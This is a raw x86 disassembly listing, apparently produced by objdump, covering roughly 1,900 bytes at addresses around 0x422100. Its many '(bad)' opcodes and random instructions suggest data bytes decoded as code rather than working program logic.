  4220f6:	adc    DWORD PTR [esi+0x10],ebx
  4220f9:	inc    esp
  4220fa:	sbb    al,0x53
  4220fc:	dec    edi
  4220fd:	sbb    DWORD PTR [edx+0x27],edx
  422100:	(bad)  
  422101:	(bad)  
  422102:	(bad)  
  422103:	jmp    FWORD PTR [esi]
  422105:	push   edx
  422106:	jbe    0x422169
  422108:	pusha  
  422109:	sub    DWORD PTR [ebx],esi
  42210b:	jnp    0x422169
  42210d:	js     0x422152
  42210f:	push   ebp
  422110:	js     0x42215d
  422112:	jge    0x42214d
  422114:	dec    ebp
  422115:	je     0x42213e
  422117:	xor    edi,DWORD PTR [ecx]
  422119:	cmp    DWORD PTR [eax+0x37],ebx
  42211c:	dec    edi
  42211d:	popa   
  42211e:	dec    edx
  42211f:	gs pop eax
  422121:	dec    edx
  422122:	and    BYTE PTR [edx],ah
  422124:	(bad)  
  422125:	mov    edi,0x5d27e3a0
  42212a:	(bad)  
  42212c:	xor    BYTE PTR [ebp+esi*1+0x50065334],ch
  422133:	sbb    DWORD PTR [ecx+0x17],esi
  422136:	or     eax,0x771e2037
  42213b:	and    eax,0xa6ffffa2
  422140:	sbb    BYTE PTR [edx],al
  422142:	and    DWORD PTR [ebx+eax*1],esp
  422145:	or     DWORD PTR [edx+eax*1+0x19],esp
  422149:	and    DWORD PTR [edx],edi
  42214b:	push   es
  42214c:	cmp    al,BYTE PTR [edi]
  42214e:	es jae 0x422174
  422151:	adc    eax,0x374b2231
  422156:	cld    
  422157:	call   DWORD PTR [edx]
  422159:	dec    ebx
  42215a:	pop    eax
  42215b:	dec    eax
  42215c:	ja     0x4221a6
  42215e:	jle    0x4221b8
  422160:	jno    0x4221b6
  422162:	data16 jns 0x4221d8
  422165:	inc    edx
  422166:	cmp    BYTE PTR [edi+0x5b],0x17
  42216a:	jmp    0x3cad204e
  42216f:	adc    esp,DWORD PTR [edx+0x7b]
  422172:	push   esp
  422173:	jbe    0x422189
  422175:	outs   dx,BYTE PTR ds:[esi]
  422176:	add    BYTE PTR [eax],dl
  422178:	jb     0x4221a2
  42217a:	sub    esi,DWORD PTR [eax+0x4f]
  42217d:	push   ebp
  42217e:	jl     0x42217f
  422180:	(bad)  
  422181:	fbstp  TBYTE PTR [ecx+0x42746524]
  422187:	popa   
  422188:	daa    
  422189:	jle    0x4221e8
  42218b:	inc    esp
  42218c:	pusha  
  42218d:	dec    ecx
  42218e:	pop    ebp
  42218f:	inc    ebp
  422190:	cmp    ebx,DWORD PTR [ecx+0x42]
  422193:	arpl   WORD PTR [edi],di
  422195:	outs   dx,BYTE PTR ds:[esi]
  422196:	push   esi
  422197:	dec    edi
  422198:	inc    esi
  422199:	dec    esi
  42219a:	cmp    esp,DWORD PTR [esi]
  42219c:	(bad)  
  42219d:	dec    DWORD PTR [edx+0x230838ff]
  4221a3:	or     eax,0x162d1420
  4221a8:	push   ss
  4221a9:	dec    esp
  4221aa:	adc    dh,BYTE PTR [eax]
  4221ac:	push   0x19
  4221ae:	cmp    al,0x8
  4221b0:	aaa    
  4221b1:	push   cs
  4221b2:	outs   dx,BYTE PTR ds:[esi]
  4221b3:	adc    al,0x15
  4221b5:	sbb    esp,DWORD PTR [ecx+0x32]
  4221b8:	imul   ebx,DWORD PTR [ecx],0xffffffff
  4221bb:	pop    ss
  4221bc:	mov    ch,0x55
  4221be:	push   ss
  4221bf:	daa    
  4221c0:	sbb    dl,ah
  4221c2:	sub    DWORD PTR [esi],esi
  4221c4:	sbb    BYTE PTR [esi+0x13],bh
  4221c7:	jae    0x4221ef
  4221c9:	or     cl,BYTE PTR [esi]
  4221cb:	xor    esp,DWORD PTR [esi]
  4221cd:	dec    esp
  4221ce:	jns    0x422207
  4221d0:	xor    al,0x2d
  4221d2:	clc    
  4221d3:	dec    ecx
  4221d4:	pop    esi
  4221d5:	bound  esi,QWORD PTR [ebp+0x72]
  4221d8:	pushf  
  4221d9:	movq   mm6,mm4
  4221dc:	add    ebx,DWORD PTR [edi+ebx*1+0x2fff434a]
  4221e3:	cli    
  4221e4:	jmp    FWORD PTR [ebx+0x1b]
  4221e7:	sbb    ch,BYTE PTR [ebx+0x49]
  4221ea:	imul   edx,DWORD PTR [esi],0x15
  4221ed:	adc    eax,0x454f4c53
  4221f2:	fidiv  WORD PTR [esi+0x55]
  4221f5:	jge    0x422261
  4221f7:	xor    bh,BYTE PTR [edx+0x41]
  4221fa:	inc    ebp
  4221fb:	sub    eax,0xf82b5a6d
  422200:	pop    ss
  422201:	pop    esp
  422202:	icebp  
  422203:	fs push esp
  422205:	dec    eax
  422206:	pusha  
  422207:	sahf   
  422208:	js     0x422275
  42220a:	jp     0x4221c2
  42220c:	dec    eax
  42220d:	push   ebx
  42220e:	ss push edx
  422210:	push   edx
  422211:	jo     0x42224f
  422213:	daa    
  422214:	(bad)  
  422215:	(bad)  
  422216:	jmp    FWORD PTR [edi+0x76]
  422219:	or     bl,BYTE PTR ds:[ebx]
  42221c:	push   ebp
  42221d:	dec    ecx
  42221e:	pop    esp
  42221f:	push   esi
  422220:	add    eax,0x13515217
  422225:	imul   ebp,DWORD PTR [esi],0x2a082c3d
  42222b:	push   ss
  42222c:	or     eax,0x210c6212
  422231:	adc    al,0x67
  422233:	ss add eax,0xffa8357c
  422239:	or     eax,0x28180e28
  42223e:	cs or  eax,0x33b41429
  422244:	add    BYTE PTR [esi],ch
  422246:	adc    BYTE PTR [ebx+ecx*8+0x28],ch
  42224a:	clc    
  42224b:	pop    ss
  42224c:	mov    dl,0x55
  42224e:	pop    ebx
  42224f:	push   edx
  422250:	pop    ecx
  422251:	inc    ebp
  422252:	addr16 jb 0x422295
  422255:	add    al,0x70
  422257:	(bad)  
  422258:	jg     0x422255
  42225a:	aaa    
  42225b:	sbb    al,0x4c
  42225d:	js     0x4222c4
  42225f:	dec    esi
  422260:	jl     0x4222c1
  422262:	push   edx
  422263:	outs   dx,DWORD PTR ds:[esi]
  422264:	stos   BYTE PTR es:[edi],al
  422265:	jnp    0x4222b7
  422267:	inc    edx
  422268:	data16 jp 0x4222b1
  42226b:	jo     0x422292
  42226d:	push   edx
  42226e:	push   esp
  42226f:	pop    ebp
  422270:	pop    ecx
  422271:	jge    0x4222ba
  422273:	push   ebx
  422274:	hlt    
  422275:	jg     0x422268
  422277:	jmp    DWORD PTR [ebp+0x63]
  42227a:	jge    0x4222f7
  42227c:	bound  eax,QWORD PTR [ebp+0x5b]
  42227f:	jne    0x4222c5
  422281:	dec    esi
  422282:	jo     0x4222ef
  422284:	shl    BYTE PTR ds:0x404f4e3d,1
  42228a:	or     BYTE PTR [edi],al
  42228c:	push   cs
  42228d:	cmp    bh,bh
  42228f:	adc    eax,0x23805f8a
  422294:	push   esp
  422295:	adc    BYTE PTR [edx+ecx*1],dh
  422298:	sub    DWORD PTR [eax+esi*8+0x6f],ebp
  42229c:	xor    DWORD PTR [ecx],ebx
  42229e:	xor    DWORD PTR [eax+ebp*2],ecx
  4222a1:	sbb    ecx,DWORD PTR [edi]
  4222a3:	adc    edi,DWORD PTR [edi+0x31fff6e0]
  4222a9:	aas    
  4222aa:	aaa    
  4222ab:	add    eax,0x260b1b29
  4222b0:	sub    DWORD PTR [ebx+edi*1+0x1],esi
  4222b4:	mov    BYTE PTR ds:0x1ae60b76,ch
  4222ba:	adc    BYTE PTR ds:0xbb495868,al
  4222c0:	(bad)  
  4222c1:	pop    ebp
  4222c2:	jmp    FWORD PTR [eax+edx*1+0x5c]
  4222c6:	jbe    0x422310
  4222c8:	jnp    0x42233d
  4222ca:	dec    esp
  4222cb:	dec    esp
  4222cc:	jp     0x422344
  4222ce:	inc    ecx
  4222cf:	outs   dx,BYTE PTR ds:[esi]
  4222d0:	push   ds
  4222d1:	pop    ebx
  4222d2:	sbb    BYTE PTR [ebx],bl
  4222d4:	jp     0x42232e
  4222d6:	push   esi
  4222d7:	clc    
  4222d8:	inc    DWORD PTR [ebp+0x47]
  4222db:	pop    edx
  4222dc:	inc    edi
  4222dd:	push   esi
  4222de:	dec    esp
  4222df:	jl     0x422335
  4222e1:	addr16 pop eax
  4222e3:	jp     0x42231a
  4222e5:	arpl   WORD PTR [ecx+0x64],di
  4222e8:	dec    edi
  4222e9:	js     0x422318
  4222eb:	jns    0x4222ec
  4222ed:	(bad)  
  4222ee:	jmp    FWORD PTR [edi-0x44]
  4222f1:	popa   
  4222f2:	cmp    al,0x47
  4222f4:	addr16 dec eax
  4222f6:	jl     0x422332
  4222f8:	inc    eax
  4222f9:	outs   dx,BYTE PTR ds:[esi]
  4222fa:	xor    al,0x77
  4222fc:	jae    0x42232d
  4222fe:	inc    edx
  4222ff:	ja     0x422371
  422301:	push   ds
  422302:	push   ebp
  422303:	xor    eax,0x39252c03
  422308:	or     BYTE PTR [ebx],al
  42230a:	das    
  42230b:	xor    cl,BYTE PTR [edi]
  42230d:	(bad)  
  42230e:	jmp    DWORD PTR [edx]
  422310:	lds    ecx,FWORD PTR [eax]
  422312:	and    BYTE PTR [esi],dh
  422314:	shr    BYTE PTR [ebx],1
  422316:	ds push ds
  422318:	cs sbb eax,0x206c131b
  42231e:	and    BYTE PTR [ecx+0x68],ah
  422321:	and    BYTE PTR [ecx+eiz*2],bl
  422324:	sub    eax,DWORD PTR [ebx+0x78ffffe2]
  42232a:	and    al,0xf
  42232c:	sbb    al,0x1b
  42232e:	xor    DWORD PTR [edi+0x15],esi
  422331:	add    bh,BYTE PTR [ecx]
  422333:	and    BYTE PTR [ebx+eax*1],dh
  422336:	jnp    0x422384
  422338:	outs   dx,DWORD PTR ds:[esi]
  422339:	or     BYTE PTR [eax+0x58],cl
  42233c:	pop    esp
  42233d:	or     al,BYTE PTR [esi+0x6f69ffff]
  422343:	add    eax,0x546875e8
  422348:	sbb    eax,0x4d4b666d
  42234d:	pop    ebx
  42234e:	jno    0x4223b2
  422350:	push   edi
  422351:	pop    esi
  422352:	dec    ecx
  422353:	fs (bad) 
  422355:	(bad)  
  422356:	in     eax,dx
  422357:	mov    ds:0x244d52ff,al
  42235c:	pop    esi
  42235d:	dec    esi
  42235e:	sub    BYTE PTR [ecx+ebp*1],ch
  422361:	outs   dx,DWORD PTR ds:[esi]
  422362:	rol    BYTE PTR [eax+edi*1+0x77],0xda
  422367:	popa   
  422368:	dec    esp
  422369:	imul   esi,DWORD PTR [ebp+0x71],0x69
  42236d:	dec    edx
  42236e:	popa   
  42236f:	(bad)  
  422370:	(bad)  [esi+0x1]
  422373:	jle    0x4223dc
  422375:	pusha  
  422376:	jae    0x4223c8
  422378:	pop    ecx
  422379:	pop    ss
  42237a:	xchg   edx,eax
  42237b:	cmp    ebx,DWORD PTR [ebx+0xa]
  42237e:	and    DWORD PTR [edi],esi
  422380:	sub    dl,BYTE PTR [edx+0x53]
  422383:	push   ss
  422384:	xor    eax,0xff805fff
  422389:	es das 
  42238b:	sub    eax,0x13687317
  422390:	cmp    eax,0x121d561c
  422395:	xor    eax,0x763c6411
  42239a:	and    bh,BYTE PTR [ebx+0x19]
  42239d:	jb     0x4223a0
  42239f:	aas    
  4223a0:	hlt    
  4223a1:	fwait
  4223a2:	(bad)  
  4223a3:	fistp  DWORD PTR [edx]
  4223a5:	das    
  4223a6:	push   es
  4223a7:	je     0x4223c9
  4223a9:	jnp    0x422419
  4223ab:	add    al,0x46
  4223ad:	or     DWORD PTR [edx],edx
  4223af:	jb     0x422393
  4223b1:	pop    esp
  4223b2:	jnp    0x4223cc
  4223b4:	add    al,0x67
  4223b6:	jo     0x4223b7
  4223b8:	fcomip st,st(0)
  4223ba:	pop    edi
  4223bb:	into   
  4223bc:	pop    es
  4223bd:	add    edx,DWORD PTR [esi]
  4223bf:	pop    edx
  4223c0:	inc    esi
  4223c1:	jp     0x422420
  4223c3:	push   ds
  4223c4:	pop    ecx
  4223c5:	js     0x4223d9
  4223c7:	push   edx
  4223c8:	push   0x42541b73
  4223cd:	cs jae 0x422428
  4223d0:	push   edx
  4223d1:	jb     0x422424
  4223d3:	(bad)  
  4223d4:	(bad)  
  4223d5:	mov    ebx,0x737a6cfe
  4223da:	jnp    0x42243c
  4223dc:	jb     0x422437
  4223de:	outs   dx,BYTE PTR ds:[esi]
  4223df:	jno    0x422426
  4223e1:	gs inc ebp
  4223e3:	jne    0x42244b
  4223e5:	cmp    BYTE PTR [esi+0x6d],al
  4223e8:	sub    BYTE PTR [ebp+0x53],dh
  4223eb:	inc    ecx
  4223ec:	dec    ecx
  4223ed:	pushw  0x5c28
  4223f1:	add    eax,0x3dffffff
  4223f6:	and    BYTE PTR [ebx],dl
  4223f8:	cvtps2pi mm4,QWORD PTR [edx]
  4223fb:	push   esp
  4223fc:	xor    DWORD PTR [ecx],ebp
  4223fe:	daa    
  4223ff:	and    DWORD PTR [edi],edx
  422401:	add    al,0x25
  422403:	cmp    ah,BYTE PTR [di]
  422406:	je     0x422414
  422408:	or     DWORD PTR [ecx],esp
  42240a:	jl     0x422440
  42240c:	add    eax,0x255311c
  422411:	aad    0x1d
  422413:	dec    edx
  422414:	and    ch,BYTE PTR ds:0xd8d0003d
  42241a:	and    al,0xfe
  42241c:	add    bh,BYTE PTR [ebp+eax*8+0x21]
  422420:	adc    DWORD PTR [eax+0x74762a06],edx
  422426:	dec    ebp
  422427:	je     0x422497
  422429:	dec    edx
  42242a:	imul   ebx,DWORD PTR [esi+0x70],0xfffc6d40
  422431:	fld    QWORD PTR [esi]
  422433:	add    ah,BYTE PTR [edi+0x64]
  422436:	dec    ebp
  422437:	ins    BYTE PTR es:[edi],dx
  422438:	dec    ebp
  422439:	inc    esp
  42243a:	inc    edx
  42243b:	pop    ebp
  42243c:	imul   esi,DWORD PTR [eax+0x60],0x444a4516
  422443:	(bad)  
  422444:	jg     0x422441
  422446:	pop    ss
  422447:	sbb    al,0x5a
  422449:	js     0x4224a7
  42244b:	jne    0x4224af
  42244d:	push   ecx
  42244e:	jne    0x4224a9
  422450:	mov    eax,0x7a2b7e7e
  422455:	dec    ebx
  422456:	and    DWORD PTR [edx+0x46],esp
  422459:	push   0x5b
  42245b:	jb     0x422498
  42245d:	ins    DWORD PTR es:[edi],dx
  42245e:	jg     0x4224bd
  422460:	jge    0x422435
  422462:	(bad)  
  422463:	inc    DWORD PTR [edx+0x73]
  422466:	jbe    0x42249f
  422468:	push   0x4b
  42246a:	pop    edx
  42246b:	xor    al,0x15
  42246d:	or     al,0x2d
  42246f:	adc    DWORD PTR [ebx],eax
  422471:	adc    edi,DWORD PTR [edi]
  422473:	push   cs
  422474:	daa    
  422475:	add    ch,dh
  422477:	push   esi
  422478:	das    
  422479:	or     DWORD PTR [eax+0xc],ebp
  42247c:	fdivr  st(4),st
  42247e:	call   DWORD PTR [edi]
  422480:	pop    eax
  422481:	sub    BYTE PTR [eax],ch
  422483:	popa   
  422484:	add    eax,0x7d36177a
  422489:	jp     0x4224c2
  42248b:	or     eax,0x1791838
  422490:	int3   
  422491:	push   ds
  422492:	xor    al,0x2b
  422494:	(bad)  
  422495:	jmp    FWORD PTR [edi+0x19b29230]
  42249b:	add    eax,0x580d0c78
  4224a0:	imul   esi,DWORD PTR [esi+0x58],0x5c
  4224a4:	push   ebp
  4224a5:	pop    ecx
  4224a6:	pop    ebp
  4224a7:	jb     0x4224f2
  4224a9:	add    bh,BYTE PTR [eax+0x58]
  4224ac:	gs sbb eax,ebx
  4224af:	add    bh,bh
  4224b1:	inc    DWORD PTR [ebp+0x69]
  4224b4:	push   0x65
  4224b6:	push   ecx
  4224b7:	push   ecx
  4224b8:	adc    eax,0x1b624051
  4224bd:	dec    ebp
  4224be:	push   edx
  4224bf:	inc    ebp
  4224c0:	outs   dx,DWORD PTR ds:[esi]
  4224c1:	dec    ebp
  4224c2:	mov    ds:0xad178aca,al
  4224c7:	jp     0x422546
  4224c9:	js     0x422522
  4224cb:	jl     0x422493
  4224cd:	inc    ebp
  4224ce:	fs inc eax
  4224d0:	cmp    WORD PTR [ebx+0x4a],bp
  4224d4:	mov    WORD PTR [edi+0x46ff15e3],?
  4224da:	pop    ebp
  4224db:	inc    edi
  4224dc:	pop    ebp
  4224dd:	inc    ecx
  4224de:	push   esi
  4224df:	dec    esp
  4224e0:	push   0x3e0538f6
  4224e5:	push   cs
  4224e6:	cmp    dl,BYTE PTR [eax+eax*1+0x13]
  4224ea:	cmp    DWORD PTR [edi],esp
  4224ec:	pop    es
  4224ed:	scas   eax,DWORD PTR es:[edi]
  4224ee:	cli    
  4224ef:	xchg   bh,bh
  4224f1:	daa    
  4224f2:	cmp    bh,BYTE PTR [ecx]
  4224f4:	pop    ss
  4224f5:	ins    BYTE PTR es:[edi],dx
  4224f6:	aaa    
  4224f7:	aas    
  4224f8:	ds push 0x303b1f92
  4224fe:	push   ss
  4224ff:	and    dh,dh
  422501:	sub    DWORD PTR ds:0xfffd0034,edi
  422507:	inc    DWORD PTR [edx+0xb311a1a]
  42250d:	jae    0x422539
  42250f:	push   0x5d792006
  422514:	jnp    0x42258d
  422516:	pop    ebp
  422517:	add    edx,DWORD PTR ds:0x4202515e
  42251d:	push   ds
  42251e:	addr16 inc eax
  422520:	push   eax
  422521:	add    bh,ah
  422523:	add    eax,0x1e20b670
  422528:	imul   ebp,DWORD PTR [ecx+ecx*2+0x59],0x65
  42252d:	jb     0x422599
  42252f:	jmp    0xd872:0x4bdbffff
  422536:	or     edx,DWORD PTR [edi+0x5d]
  422539:	das    
  42253a:	dec    eax
  42253b:	inc    ebx
  42253c:	pop    esp
  42253d:	dec    ebx
  42253e:	push   ebp
  42253f:	pop    esi
  422540:	inc    ebx
  422541:	sub    al,0x5e
  422543:	inc    eax
  422544:	and    DWORD PTR [ebx+0x74],esi
  422547:	inc    ebx
  422548:	dec    ebx
  422549:	xor    al,0x5c
  42254b:	call   FWORD PTR [ebx]
  42254d:	cmp    bl,BYTE PTR [edx+0x727524f8]
  422553:	xor    BYTE PTR [eax+0x85d2d4e],bh
  422559:	add    al,0x2c
  42255b:	adc    ecx,DWORD PTR [edi+edx*1]
  42255e:	or     al,0xff
  422560:	jmp    FWORD PTR [edi+0x501c35fa]
  422566:	or     DWORD PTR [esi+edx*4],ebp
  422569:	pop    ds
  42256a:	pop    ss
  42256b:	and    al,0xc
  42256d:	adc    BYTE PTR ds:[eax],dh
  422570:	sbb    eax,0x227b0513
  422575:	add    edi,DWORD PTR ds:0x1b3d7a15
  42257b:	or     ch,BYTE PTR ds:0xffb7e3bf
  422581:	push   es
  422582:	sbb    DWORD PTR [ecx+0x21],edi
  422585:	xor    eax,0x2b7a1773
  42258a:	dec    BYTE PTR [ecx]
  42258c:	pop    ebx
  42258d:	push   ebx
  42258e:	jg     0x422592
  422590:	push   0x2a
  422592:	xorps  xmm6,XMMWORD PTR [edi+0x78]
  422596:	add    ecx,DWORD PTR [ebx-0x1]
  422599:	(bad)  
  42259a:	(bad)  
  42259b:	dec    DWORD PTR [ebx+0x51]
  42259e:	dec    ebx
  42259f:	sbb    bl,BYTE PTR [esi+0x44]
  4225a2:	sbb    BYTE PTR [ebp+0x4c],bl
  4225a5:	sbb    eax,DWORD PTR [eax+0x65]
  4225a8:	push   ebx
  4225a9:	pusha  
  4225aa:	gs jnp 0x4225f4
  4225ad:	arpl   WORD PTR [esi+0x35],sp
  4225b0:	das    
  4225b1:	jns    0x4225db
  4225b3:	push   0x59565a49
  4225b8:	fs ins BYTE PTR es:[edi],dx
  4225ba:	bound  ebx,QWORD PTR [ebx+0x1c]
  4225bd:	stos   DWORD PTR es:[edi],eax
  4225be:	or     dh,al
  4225c0:	jns    0x422618
  4225c2:	inc    ecx
  4225c3:	ss jo  0x422607
  4225c6:	fadd   DWORD PTR [ebp+0x46]
  4225c9:	sbb    bl,bh
  4225cb:	jo     0x4225a4
  4225cd:	fild   WORD PTR [edx+0x53]
  4225d0:	sub    BYTE PTR fs:[edx],al
  4225d3:	aas    
  4225d4:	inc    eax
  4225d5:	divps  xmm3,XMMWORD PTR ds:0x25a2242e
  4225dc:	adc    esp,DWORD PTR [ecx]
  4225de:	ds sbb edi,edi
  4225e1:	mov    edi,esi
  4225e3:	call   FWORD PTR [ecx]
  4225e5:	cmp    eax,0x6d03322e
  4225ea:	cmp    al,0x3
  4225ec:	adc    al,0x3d
  4225ee:	sub    esp,DWORD PTR es:[edi+0x11]
  4225f2:	pop    ss
  4225f3:	inc    esi
  4225f4:	cmp    ah,BYTE PTR ds:[edx]
  4225f7:	adc    edi,DWORD PTR [ebx+0x33]
  4225fa:	pop    ss
  4225fb:	sbb    eax,0xfffa6803
  422600:	(bad)  
  422602:	and    eax,0x7a4f790c
  422607:	pop    esp
  422608:	inc    esi
  422609:	fimul  WORD PTR [edx]
  42260b:	push   ebp
  42260c:	push   cs
  42260d:	dec    edi
  42260e:	pop    ebp
  42260f:	jbe    0x422617
  422611:	push   ebp
  422612:	bound  eax,QWORD PTR [eax+0x7c]
  422615:	pop    esi
  422616:	sbb    eax,0x4a4d7f5f
  42261b:	dec    esi
  42261c:	or     DWORD PTR [esi+0x4750affa],ebp
  422622:	push   ebp
  422623:	push   ecx
  422624:	gs dec di
  422627:	push   ebx
  422628:	push   0x79
  42262a:	ret    0x555f
  42262d:	jle    0x42261d
  42262f:	jmp    FWORD PTR [ebx+0x5a3a17ec]
  422635:	inc    esp
  422636:	inc    ecx
  422637:	inc    eax
  422638:	pop    ebx
  422639:	cmp    al,0x3a
  42263b:	push   ds
  42263c:	jg     0x422696
  42263e:	jb     0x4226a9
  422640:	inc    esp
  422641:	popa   
  422642:	ja     0x4226be
  422644:	push   ecx
  422645:	pop    es
  422646:	(bad)  
  422647:	inc    DWORD PTR [esi+0x110800ff]
  42264d:	sub    eax,0x1601095f
  422652:	dec    esi
  422653:	xchg   esp,eax
  422654:	sub    ebp,DWORD PTR [ecx]
  422656:	adc    eax,0x6e181c2f
  42265b:	cmp    BYTE PTR ds:0x2236292e,cl
  422661:	adc    dl,BYTE PTR ss:[esi]
  422664:	aaa    
  422665:	std    
  422666:	(bad)  
  422667:	(bad)  
  422668:	cmp    esp,DWORD PTR ds:0x3d1c0502
  42266e:	add    DWORD PTR [esi],ebx
  422670:	and    edi,DWORD PTR [eax+edx*1]
  422673:	jle    0x4226ec
  422675:	cs pop es
  422677:	jp     0x42268e
  422679:	aaa    
  42267a:	xor    eax,0xd85e6f0c
  42267f:	pop    ebx
  422680:	inc    eax
  422681:	push   esp
  422682:	(bad)  
  422683:	(bad)  
  422684:	call   DWORD PTR ds:0x52776f64
  42268a:	push   edi
  42268b:	inc    esi
  42268c:	pusha  
  42268d:	sbb    al,0x48
  42268f:	arpl   WORD PTR [ebx+0x7e],sp
  422692:	adc    al,BYTE PTR [edx]
  422694:	adc    DWORD PTR [ecx+0x6c],eax
  422697:	push   edx
  422698:	inc    edi
  422699:	je     0x4226ea
  42269b:	sbb    BYTE PTR [ebx+0x4f],dl
  42269e:	ja     0x42270f
  4226a0:	lock call DWORD PTR [eax-0x3]
  4226a4:	jle    0x4226da
  4226a6:	jne    0x4226fe
  4226a8:	jle    0x422711
  4226aa:	mov    edx,0x48254554
  4226af:	cmp    al,0x59
  4226b1:	pop    edi
  4226b2:	outs   dx,DWORD PTR ds:[esi]
  4226b3:	push   ebx
  4226b4:	(bad)  
  4226b5:	(bad)  
  4226b6:	call   FWORD PTR [edi-0x8]
  4226b9:	pop    esi
  4226ba:	pusha  
  4226bb:	fs inc edx
  4226bd:	push   esi
  4226be:	pop    ebx
  4226bf:	dec    esp
  4226c0:	cmp    bh,BYTE PTR ds:0x1b58335b
  4226c6:	cmp    BYTE PTR [edi],ch
  4226c8:	and    edx,DWORD PTR [ebx]
  4226ca:	add    dl,BYTE PTR ds:0x27582026
  4226d0:	adc    al,0xd
  4226d2:	and    eax,0x1b313b36
  4226d7:	outs   dx,BYTE PTR ds:[esi]
  4226d8:	jg     0x4226ad
  4226da:	punpcklwd mm7,mm2
  4226dd:	push   ds
  4226de:	cmp    al,0x31
  4226e0:	and    DWORD PTR [ecx],ebx
  4226e2:	sbb    esi,DWORD PTR [esi]
  4226e4:	ficom  DWORD PTR [ecx]
  4226e6:	sub    DWORD PTR [edi],ebx
  4226e8:	mov    al,0x25
  4226ea:	sub    ch,dh
  4226ec:	sbb    edi,esi
  4226ee:	dec    DWORD PTR [edx]
  4226f0:	pcmpeqw mm6,QWORD PTR [ecx]
  4226f3:	aaa    
  4226f4:	ins    BYTE PTR es:[edi],dx
  4226f5:	inc    edi
  4226f6:	pop    esp
  4226f7:	jge    0x422765
  4226f9:	jl     0x422769
  4226fb:	or     ah,BYTE PTR [ebp+0x70]
  4226fe:	outs   dx,BYTE PTR ds:[esi]
  4226ff:	sbb    BYTE PTR [ecx],al
  422701:	or     BYTE PTR [edx+0x5c],ch
  422704:	jp     0x422775
  422706:	fsub   DWORD PTR [ebp+ebx*2-0x46]
  42270a:	pop    ebx
  42270b:	ins    BYTE PTR es:[edi],dx
  42270c:	pop    edx
  42270d:	dec    edx
  42270e:	jne    0x42272d
  422710:	ins    BYTE PTR es:[edi],dx
  422711:	dec    eax
  422712:	adc    dh,BYTE PTR [eax+edx*2]
  422715:	call   0x5f4226c1
  42271a:	ins    DWORD PTR es:[edi],dx
  42271b:	outs   dx,BYTE PTR ds:[esi]
  42271c:	jle    0x42279b
  42271e:	dec    esp
  42271f:	jg     0x422774
  422721:	es es push ebp
  422724:	and    esi,DWORD PTR [ebp+0x7d]
  422727:	jle    0x4227a4
  422729:	xor    al,0xde
  42272b:	push   0x31
  42272d:	dec    esp
  42272e:	cmc    
  42272f:	call   DWORD PTR ds:0x6a4298bf
  422735:	sub    DWORD PTR [edi+0xb],esp
  422738:	cs out 0x4,al
  42273b:	sbb    ebx,DWORD PTR ds:0x222b0f37
  422741:	push   ecx
  422742:	sub    eax,0xa683251
  422747:	(bad)  
  422748:	inc    DWORD PTR [edx]
  42274a:	pop    esp
  42274b:	jp     0x422776
  42274d:	or     DWORD PTR [eax],ebp
  42274f:	call   0x787a5a92
  422754:	es xor eax,0x3037713
  42275a:	sbb    edi,DWORD PTR ss:[eax+0x13]
  42275e:	jp     0x422773
  422760:	in     eax,dx
  422761:	adc    eax,0x2b01d06f
  422766:	sub    ch,BYTE PTR [esi+0x22]
  422769:	jle    0x422771
  42276b:	pop    eax
  42276c:	add    cl,BYTE PTR [ebx+0x16]
  42276f:	pop    ecx
  422770:	push   cs
  422771:	pop    es
  422772:	(bad)  
  422773:	call   DWORD PTR [edi]
  422775:	std    
  422776:	push   ebp
  422777:	push   edi
  422778:	bound  eax,QWORD PTR [ebx+0x53]
  42277b:	pop    edi
  42277c:	jmp    0x434b:0x4146617d
  422783:	adc    al,0x73
  422785:	jl     0x4227fb
  422787:	push   0x6f
  422789:	outs   dx,BYTE PTR ds:[esi]
  42278a:	outs   dx,DWORD PTR ds:[esi]
  42278b:	sub    al,0x4c
  42278d:	dec    eax
  42278e:	sub    eax,0xebbfe35b
  422793:	inc    DWORD PTR [ecx+0x5e]
  422796:	arpl   WORD PTR [edi+0x47],dx
  422799:	push   edx
  42279a:	inc    ebx
  42279b:	pop    ebx
  42279c:	imul   esp,DWORD PTR [edx],0x7d76c869
  4227a2:	inc    ecx
  4227a3:	data16 cmp al,0x52
  4227a6:	arpl   WORD PTR [ebx+esi*1-0x2f],si
  4227aa:	(bad)  
  4227ab:	(bad)  
  4227ac:	mov    edi,0x370d7694
  4227b1:	sub    ebx,DWORD PTR [edx+0x19]
  4227b4:	sbb    al,0x1
  4227b6:	sbb    eax,0x5b2c4a02
  4227bb:	add    al,0x11
  4227bd:	adc    ch,BYTE PTR [ebx]
  4227bf:	aas    
  4227c0:	pop    ss
  4227c1:	cmp    edx,DWORD PTR [edi]
  4227c3:	xor    bl,BYTE PTR [esi]
  4227c5:	add    DWORD PTR [ebx+edx*8],ecx
  4227c8:	scas   eax,DWORD PTR es:[edi]
  4227c9:	pop    edx
  4227ca:	jno    0x4227fd
  4227cc:	or     eax,0x2e36741f
  4227d1:	out    dx,al
  4227d2:	adc    eax,0xd191c1e
  4227d7:	jbe    0x422833
  4227d9:	mov    bl,BYTE PTR [ebx]
  4227db:	(bad)  
  4227dc:	jg     0x42280e
  4227de:	sbb    eax,DWORD PTR [edi]
  4227e0:	aaa    
  4227e1:	es dec ecx
  4227e3:	adc    DWORD PTR [ecx+ebx*2+0x4e],edi
  4227e7:	pop    eax
  4227e8:	imul   ebp,DWORD PTR [ebx+0x5a],0x5005638a
  4227ef:	outs   dx,BYTE PTR ds:[esi]
  4227f0:	pop    esp
  4227f1:	cmc    
  4227f2:	jg     0x4227c5
  4227f4:	inc    eax
  4227f5:	dec    ebp
  4227f6:	mov    dl,0x67
  4227f8:	push   edx
  4227f9:	pop    ecx
  4227fa:	pop    es
  4227fb:	adc    al,0x45
  4227fd:	jae    0x42280e
  4227ff:	push   0x4a124c41
  422804:	ins    DWORD PTR es:[edi],dx
  422805:	dec    ebp
  422806:	mov    edx,0x8002d168
  42280b:	ins    DWORD PTR es:[edi],dx
  42280c:	pop    ecx
  42280d:	ds pop edi
  42280f:	es in  al,0x41
  422812:	push   0xdfffc039
  422817:	and    eax,0x7f5c88a4
  42281c:	cmp    al,0x77
  42281e:	inc    edx
  42281f:	jbe    0x422851
  422821:	sub    BYTE PTR [eax+0x51],dh
  422824:	push   edi
  422825:	sbb    BYTE PTR [esi],cl
  422827:	cmp    al,0x7
  422829:	push   ss
  42282a:	push   esp
  42282b:	or     BYTE PTR [esi],ch
  42282d:	je     0x422835
  42282f:	sub    eax,0x65e5a10
  422834:	test   al,0x76
  422836:	cmp    eax,0xdf0dff86
  42283b:	rcl    BYTE PTR [ebx],1
  42283d:	xor    DWORD PTR [edx],edi
  42283f:	fs push es
  422841:	pusha  
